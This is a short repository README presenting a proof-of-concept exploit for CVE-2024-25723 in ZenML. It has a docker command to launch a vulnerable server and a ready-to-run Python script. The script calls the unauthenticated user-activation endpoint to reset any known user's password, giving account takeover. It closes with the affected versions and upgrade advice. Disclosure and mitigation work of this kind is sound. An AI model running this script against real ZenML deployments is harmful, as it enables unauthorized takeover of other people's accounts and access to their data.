# Exploit for CVE-2024-25723

This repository is dedicated to addressing CVE-2024-25723, a critical security vulnerability in ZenML, with an educational Proof of Concept (PoC) provided to illustrate the issue and encourage prompt mitigation. The PoC demonstrates how an unauthorized user could potentially exploit the vulnerability to take ownership of any ZenML accounts. It's crucial to approach this information with the intent to safeguard systems, not to harm.

## Proof of concept (PoC)

1)  `docker run -it -d -p 8080:8080 --name zenml zenmldocker/zenml-server:0.46.0`
 
2)
```python
import requests

base_url = "http://localhost:8080"
user = "default"
new_password = "3gx9AbzP92rfHhZ"

activate_api_url = f"{base_url}/api/v1/users/{user}/activate"
#print(activate_api_url)
activate_api_headers = {"Content-Type": "application/json"}
activate_api_json={"password": new_password}
activate_api_response = requests.put(activate_api_url, headers=activate_api_headers, json=activate_api_json)
print(activate_api_response.json())
```

3) If the default user called "default" is registered and ZenML is on a vulnerable version, the exploit will be executed successfully and the new password for this account will be: "3gx9AbzP92rfHhZ" (for the exploit to work, it is necessary to know the name of the target user).

## Affected Versions:
All ZenML versions below 0.46.7 are vulnerable, with the exception of the following patch versions: (0.44.4, 0.43.1, 0.42.2).

## Immediate Action Required:
Upgrade to the latest version (0.46.7 or above) or one of the patched versions (0.44.4, 0.43.1, 0.42.2) to mitigate this risk.
